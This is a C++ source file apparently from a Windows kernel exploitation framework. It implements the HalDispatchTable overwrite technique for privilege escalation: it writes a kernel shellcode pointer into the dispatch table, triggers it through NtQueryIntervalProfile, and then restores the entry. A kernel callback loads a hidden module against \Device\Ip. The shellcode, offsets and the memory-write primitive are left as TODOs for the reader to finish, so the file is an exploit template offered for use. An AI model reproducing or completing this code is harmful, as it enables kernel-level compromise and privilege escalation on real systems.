#include "exploit.h"
#include <Common/usr_common.h>

#include "kernelinfo.hpp"

#include <Common/exploitation/kernelbreak.h>
#include <Common/exploitation/extinterface.h>

#include <loader/src/Loader.hpp>
#include <loader/src/user/UserModule.hpp>

CExploit::CExploit(
	__in IKernelBreak& kernelBreak
	) : m_kernelBreak(kernelBreak)
{
}

//cpl0 code
__drv_maxIRQL(PASSIVE_LEVEL)
void
CExploit::KernelCallback(
	__in const RING3_2_RING0_PARAM& param
	)
{
	//formed on kernel stack
	extinterface::PACKET packet;
	packet.PayloadId = param.PayloadId;
	
	switch (param.PayloadId)
	{
	case extinterface::CORE_PAYLOAD::PingEchoE:
	default:
		packet.PayloadId = extinterface::CORE_PAYLOAD::PingEchoE;
		break;
	}	
	
	auto loader = CLoader::KernelLoader(param.NtBase, CDllModule::ModuleBase());
	if (!loader)
		return;

	auto sys_loader = loader->GetProc<decltype(&SystemLoader)>("_SystemLoader@8");

	if (sys_loader)
		sys_loader(L"\\Device\\Ip", packet);
}

//got kernel escape via HalDispatchTable .. finish implementation by your own ..
void
CExploit::HalDispatchExploitTech()
{
	if (!m_kernelSpace.IsResolved())
		return;

	if (!m_kernelSpace.GetHalBase())
		return;

	void* kernel_shellcode = nullptr;

	//TODO :
	//resolve kernel_shellcode HERE! <= it is your kernel mode code / ROP

	if (!kernel_shellcode)
		return;
	
	RING3_2_RING0_PARAM param =
	{
		reinterpret_cast<size_t>(KernelCallback) - reinterpret_cast<size_t>(&param),
		extinterface::CORE_PAYLOAD::PingEchoE,
		reinterpret_cast<const void*>(m_kernelSpace.GetNtBase())
	};

	size_t hall_dispatch_offset = 0;

	//TODO :
	//resolve hall_dispatch_offset HERE <= you can do it by static offset from base per windows version if you want ...

	void** hall_dispatch = reinterpret_cast<void**>(m_kernelSpace.GetHalBase() + hall_dispatch_offset);
	
	const void* hali_query_system_information = nullptr;

	//TODO :
	//resolve hali_query_system_information HERE <= you can do it by static offset from base per windows version if you want ...

	WriteKernelMemory(&hall_dispatch[1], &kernel_shellcode, sizeof(kernel_shellcode));

	//switch to kernel!
	NtQueryIntervalProfile((enum KPROFILE_SOURCE)2, &param);

	//sweep corrupted data
	WriteKernelMemory(&hall_dispatch[1], &hali_query_system_information, sizeof(kernel_shellcode));
}

__checkReturn
bool
CExploit::WriteKernelMemory(
	__inout_bcount(size) void* addr,
	__in_bcount(size) const void* buff,
	__in size_t size
	)
{
	//TODO :
	//implement it by yourself -> per vulnerability, or some generic approach related to vulnerability class...
	return false;
}

__checkReturn
bool
CExploit::ReadKernelMemory(
	__in_bcount(size) const void* addr,
	__inout_bcount(size) void* buff,
	__in size_t size
)
{
	return false;
}
